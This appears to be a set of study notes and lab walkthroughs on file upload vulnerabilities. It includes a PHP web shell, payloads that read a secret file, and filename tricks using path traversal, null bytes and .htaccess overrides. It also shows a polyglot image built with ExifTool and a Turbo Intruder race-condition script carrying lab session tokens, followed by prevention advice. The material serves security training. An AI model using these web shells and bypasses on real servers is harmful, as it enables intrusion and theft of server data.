# File upload vulnerabilities

File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. 

## What is the impact of file upload vulnerabilities?

In the worst case scenario, the file's type isn't validated properly, and the server configuration allows certain types of file (such as .php and .jsp) to be executed as code.

Failing to make sure that the size of the file falls within expected thresholds could also enable a form of denial-of-service (DoS) attack, whereby the attacker fills the available disk space.

## Exploiting unrestricted file uploads to deploy a web shell

From a security perspective, the worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server.

A more versatile web shell may look something like this:

```<?php echo system($_GET['command']); ?> ```
This script enables you to pass an arbitrary system command via a query parameter as follows:

```GET /example/exploit.php?command=id HTTP/1.1```

### Remote code execution via web shell upload

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. 

**Solution:**
1. While proxying traffic through Burp, log in to your account and notice the option for uploading an avatar image.
2. Upload an arbitrary image, then return to your account page. Notice that a preview of your avatar is now displayed on the page.
3. In Burp, go to **Proxy** > **HTTP history**. Click the filter bar to open the **Filter settings** dialog. Under **Filter by MIME type**, enable the **Images** checkbox, then apply your changes.
4. In the proxy history, notice that your image was fetched using a *GET* request to ```/files/avatars/<YOUR-IMAGE>```. Send this request to Burp Repeater.
5. On your system, create a file called *exploit.php*, containing a script for fetching the contents of Carlos's secret file. For example:
    ```<?php echo file_get_contents('/home/carlos/secret'); ?>```
6. Use the avatar upload function to upload your malicious PHP file. The message in the response confirms that this was uploaded successfully.
7. In Burp Repeater, change the path of the request to point to your PHP file:
    ```GET /files/avatars/exploit.php HTTP/1.1```
8. Send the request. Notice that the server has executed your script and returned its output (Carlos's secret) in the response.
9. Submit the secret to solve the lab.

## Exploiting flawed validation of file uploads

When submitting HTML forms, the browser typically sends the provided data in a POST request with the content type application/x-www-form-url-encoded. This is fine for sending simple text like your name, address, and so on, but is not suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type multipart/form-data is the preferred approach.

### Web shell upload via Content-Type restriction bypass

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret.

**Solution:**
1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a *GET* request to ```/files/avatars/<YOUR-IMAGE>```. Send this request to Burp Repeater.
3. On your system, create a file called *exploit.php*, containing a script for fetching the contents of Carlos's secret. For example:
    ```<?php system('cat /home/carlos/secret'); ?>```
4. Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload files with the MIME type *image/jpeg* or *image/png*.
5. In Burp, go back to the proxy history and find the POST */my-account/avatar* request that was used to submit the file upload. Send this to Burp Repeater.
6. In Burp Repeater, go to the tab containing the POST */my-account/avatar* request. In the part of the message body related to your file, change the specified  *Content-Type* to *image/jpeg*.
7. Send the request. Observe that the response indicates that your file was successfully uploaded.
8. Switch to the other Repeater tab containing the ```GET /files/avatars/<YOUR-IMAGE>``` request. In the path, replace the name of your image file with *exploit.php* and send the request. Observe that Carlos's secret was returned in the response.
9. Submit the secret to solve the lab.

## Preventing file execution in user-accessible directories

While it's clearly better to prevent dangerous file types being uploaded in the first place, the second line of defense is to stop the server from executing any scripts that do slip through the net.

### Web shell upload via path traversal

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret

**Solution:**
1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a *GET* request to ```/files/avatars/<YOUR-IMAGE>```. Send this request to Burp Repeater.
3. On your system, create a file called *exploit.php*, containing a script for fetching the contents of Carlos's secret. For example:
    ```<?php echo file_get_contents('/home/carlos/secret'); ?>```
4. Upload this script as your avatar. Notice that the website doesn't seem to prevent you from uploading PHP files.
5. In Burp Repeater, go to the tab containing the ```GET /files/avatars/<YOUR-IMAGE>``` request. In the path, replace the name of your image file with *exploit.php* and send the request. Observe that instead of executing the script and returning the output, the server has just returned the contents of the PHP file as plain text.
6. In Burp's proxy history, find the *POST /my-account/avatar* request that was used to submit the file upload and send it to Burp Repeater.
7. In Burp Repeater, go to the tab containing the *POST /my-account/avatar* request and find the part of the request body that relates to your PHP file. In the *Content-Disposition* header, change the *filename* to include a directory traversal sequence:
    ```Content-Disposition: form-data; name="avatar"; filename="../exploit.php"```
8. Send the request. Notice that the response says *The file avatars/exploit.php has been uploaded*. This suggests that the server is stripping the directory traversal sequence from the file name.
9. Obfuscate the directory traversal sequence by URL encoding the forward slash (/) character, resulting in:
    ```filename="..%2fexploit.php"```
10. Send the request and observe that the message now says *The file avatars/../exploit.php has been uploaded*. This indicates that the file name is being URL decoded by the server.
11. In the browser, go back to your account page.
12. In Burp's proxy history, find the *GET /files/avatars/..%2fexploit.php* request. Observe that Carlos's secret was returned in the response. This indicates that the file was uploaded to a higher directory in the filesystem hierarchy (*/files*), and subsequently executed by the server. Note that this means you can also request this file using *GET /files/exploit.php*.
13. Submit the secret to solve the lab.

## Insufficient blacklisting of dangerous file types

### Overriding the server configuration

As we discussed in the previous section, servers typically won't execute files unless they have been configured to do so. For example, before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their /etc/apache2/apache2.conf file:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

Apache servers, for example, will load a directory-specific configuration from a file called .htaccess if one is present.

Similarly, developers can make directory-specific configuration on IIS servers using a web.config file. This might include directives such as the following, which in this case allows JSON files to be served to users:

```
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

### Web shell upload via extension blacklist bypass

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

**Solution:**
1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a *GET* request to ```/files/avatars/<YOUR-IMAGE>```. Send this request to Burp Repeater.
3. On your system, create a file called *exploit.php* containing a script for fetching the contents of Carlos's secret. For example:
    ```<?php echo file_get_contents('/home/carlos/secret'); ?>```
4. Attempt to upload this script as your avatar. The response indicates that you are not allowed to upload files with a *.php* extension.
5. In Burp's proxy history, find the *POST /my-account/avatar* request that was used to submit the file upload. In the response, notice that the headers reveal that you're talking to an Apache server. Send this request to Burp Repeater.
6. In Burp Repeater, go to the tab for the *POST /my-account/avatar* request and find the part of the body that relates to your PHP file. Make the following changes:
- Change the value of the filename parameter to .htaccess.
- Change the value of the Content-Type header to text/plain.
- Replace the contents of the file (your PHP payload) with the following Apache directive:
    ```AddType application/x-httpd-php .l33t```
This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module, it knows how to handle this already.
7. Send the request and observe that the file was successfully uploaded.
8. Use the back arrow in Burp Repeater to return to the original request for uploading your PHP exploit.
9. Change the value of the *filename* parameter from *exploit.php* to *exploit.l33t*. Send the request again and notice that the file was uploaded successfully.
10. Switch to the other Repeater tab containing the ```GET /files/avatars/<YOUR-IMAGE>``` request. In the path, replace the name of your image file with *exploit.l33t* and send the request. Observe that Carlos's secret was returned in the response. Thanks to our malicious *.htaccess* file, the *.l33t* file was executed as if it were a *.php* file.
11. Submit the secret to solve the lab.

### Obfuscating file extensions

Even the most exhaustive blacklists can potentially be bypassed using classic obfuscation techniques. Let's say the validation code is case sensitive and fails to recognize that exploit.pHp is in fact a .php file. If the code that subsequently maps the file extension to a MIME type is not case sensitive, this discrepancy allows you to sneak malicious PHP files past validation that may eventually be executed by the server.

You can also achieve similar results using the following techniques:
- Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: exploit.php.jpg
- Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: exploit.php.
- Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: exploit%2Ephp
- Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: exploit.asp;.jpg or exploit.asp%00.jpg
- Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.

### Web shell upload via obfuscated file extension

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

**Solution:**
1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a *GET* request to ```/files/avatars/<YOUR-IMAGE>```. Send this request to Burp Repeater.
3. On your system, create a file called *exploit.php*, containing a script for fetching the contents of Carlos's secret. For example:
    ```<?php system('cat /home/carlos/secret'); ?>```
4. Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload JPG and PNG files.
5. In Burp's proxy history, find the *POST /my-account/avatar* request that was used to submit the file upload. Send this to Burp Repeater.
6. In Burp Repeater, go to the tab for the *POST /my-account/avatar* request and find the part of the body that relates to your PHP file. In the Content-Disposition header, change the value of the *filename* parameter to include a URL encoded null byte, followed by the *.jpg* extension:
    ```filename="exploit.php%00.jpg"```
7. Send the request and observe that the file was successfully uploaded. Notice that the message refers to the file as *exploit.php*, suggesting that the null byte and *.jpg* extension have been stripped.
8. Switch to the other Repeater tab containing the ```GET /files/avatars/<YOUR-IMAGE>``` request. In the path, replace the name of your image file with *exploit.php* and send the request. Observe that Carlos's secret was returned in the response.
9. Submit the secret to solve the lab.

## Flawed validation of the file's contents

Instead of implicitly trusting the Content-Type specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.

In the case of an image upload function, the server might try to verify certain intrinsic properties of an image, such as its dimensions. If you try uploading a PHP script, for example, it won't have any dimensions at all. Therefore, the server can deduce that it can't possibly be an image, and reject the upload accordingly.

Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes FF D8 FF.

### Remote code execution via polyglot web shell upload

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

**Solution:**
1. On your system, create a file called *exploit.php* containing a script for fetching the contents of Carlos's secret. For example:
    ```<?php system('cat /home/carlos/secret'); ?>```
2. Log in and attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.
3. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:
    ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php```
    
    This adds your PHP payload to the image's Comment field, then saves the image with a .php extension.
4. In the browser, upload the polyglot image as your avatar, then go back to your account page.
5. In Burp's proxy history, find the *GET /files/avatars/polyglot.php* request. Use the message editor's search feature to find the START string somewhere within the binary image data in the response. Between this and the *END* string, you should see Carlos's secret, for example:
    ```START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END```
6. Submit the secret to solve the lab.

## Exploiting file upload race conditions

Modern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.

### Web shell upload via race condition

This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.

**Solution:**
1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a *GET* request to ```/files/avatars/<YOUR-IMAGE>```.
3. On your system, create a file called *exploit.php* containing a script for fetching the contents of Carlos's secret. For example:
    ```<?php echo file_get_contents('/home/carlos/secret'); ?>```
4. Log in and attempt to upload the script as your avatar. Observe that the server appears to successfully prevent you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.
5. If you haven't already, add the Turbo Intruder extension to Burp from the BApp store.
6. Right-click on the *POST /my-account/avatar* request that was used to submit the file upload and select **Extensions > Turbo Intruder > Send to turbo intruder**. The Turbo Intruder window opens.
7. Copy and paste the following script template into Turbo Intruder's Python editor:
    ```
    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

        request1 = '''POST /my-account/avatar HTTP/1.1
    Host: 0a5800fd0486a9fcc19421f7005b00a5.web-security-academy.net
    Cookie: session=Sa2wTScQmkrtqjubgL49o18hvzNv9Y6A
    Content-Length: 409
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "macOS"
    Upgrade-Insecure-Requests: 1
    Origin: https://0a5800fd0486a9fcc19421f7005b00a5.web-security-academy.net
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfQhC1hjGQEWZFiRu
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0a5800fd0486a9fcc19421f7005b00a5.web-security-academy.net/my-account
    Accept-Encoding: gzip, deflate
    Accept-Language: cs-CZ,cs;q=0.9
    Connection: close

    ------WebKitFormBoundaryfQhC1hjGQEWZFiRu
    Content-Disposition: form-data; name="avatar"; filename="pokus.php"
    Content-Type: application/octet-stream

    <?php system('cat /home/carlos/secret'); ?>
    ------WebKitFormBoundaryfQhC1hjGQEWZFiRu
    Content-Disposition: form-data; name="user"

    wiener
    ------WebKitFormBoundaryfQhC1hjGQEWZFiRu
    Content-Disposition: form-data; name="csrf"

    e5yYfZ31CDic45UJkaGjFACU06uMfr2H
    ------WebKitFormBoundaryfQhC1hjGQEWZFiRu--\r\n\r\n
    '''

        request2 = '''GET /files/avatars/pokus.php HTTP/1.1
    Host: 0a5800fd0486a9fcc19421f7005b00a5.web-security-academy.net
    Cookie: session=Sa2wTScQmkrtqjubgL49o18hvzNv9Y6A
    Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
    Sec-Ch-Ua-Mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
    Sec-Ch-Ua-Platform: "macOS"
    Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: no-cors
    Sec-Fetch-Dest: image
    Referer: https://0a5800fd0486a9fcc19421f7005b00a5.web-security-academy.net/my-account
    Accept-Encoding: gzip, deflate
    Accept-Language: cs-CZ,cs;q=0.9
    Connection: close\r\n\r\n
    '''
        # the 'gate' argument blocks the final byte of each request until openGate is invoked
        engine.queue(request1, gate='race1')
        for x in range(5):
            engine.queue(request2, gate='race1')

        # wait until every 'race1' tagged request is ready
        # then send the final byte of each request
        # (this method is non-blocking, just like queue)
        engine.openGate('race1')

        engine.complete(timeout=60)


    def handleResponse(req, interesting):
        table.add(req)
    ```
8. In the script, replace ```<YOUR-POST-REQUEST>``` with the entire *POST /my-account/avatar* request containing your *exploit.php* file. You can copy and paste this from the top of the Turbo Intruder window.
9. Replace ```<YOUR-GET-REQUEST>``` with a GET request for fetching your uploaded PHP file. The simplest way to do this is to copy the ```GET /files/avatars/<YOUR-IMAGE>``` request from your proxy history, then change the filename in the path to *exploit.php*.
10.  At the bottom of the Turbo Intruder window, click **Attack**. This script will submit a single *POST* request to upload your *exploit.php* file, instantly followed by 5 *GET* requests to ```/files/avatars/exploit.php```.
11.  In the results list, notice that some of the *GET* requests received a 200 response containing Carlos's secret. These requests hit the server after the PHP file was uploaded, but before it failed validation and was deleted.
12.  Submit the secret to solve the lab.

### Race conditions in URL-based file uploads

Similar race conditions can occur in functions that allow you to upload a file by providing a URL. In this case, the server has to fetch the file over the internet and create a local copy before it can perform any validation.

As the file is loaded using HTTP, developers are unable to use their framework's built-in mechanisms for securely validating files. Instead, they may manually create their own processes for temporarily storing and validating the file, which may not be quite as secure.

## Exploiting file upload vulnerabilities without remote code execution

### Uploading malicious client-side scripts

For example, if you can upload HTML files or SVG images, you can potentially use ```<script>``` tags to create stored XSS payloads.

If the uploaded file then appears on a page that is visited by other users, their browser will execute the script when it tries to render the page. Note that due to same-origin policy restrictions, these kinds of attacks will only work if the uploaded file is served from the same origin to which you upload it.

### Exploiting vulnerabilities in the parsing of uploaded files

If the uploaded file seems to be both stored and served securely, the last resort is to try exploiting vulnerabilities specific to the parsing or processing of different file formats. For example, you know that the server parses XML-based files, such as Microsoft Office .doc or .xls files, this may be a potential vector for XXE injection attacks.

### Uploading files using PUT

It's worth noting that some web servers may be configured to support PUT requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface.

```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

## How to prevent file upload vulnerabilities

- Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones. It's much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload.
- Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence (../).
- Rename uploaded files to avoid collisions that may cause existing files to be overwritten.
- Do not upload files to the server's permanent filesystem until they have been fully validated.
- As much as possible, use an established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms.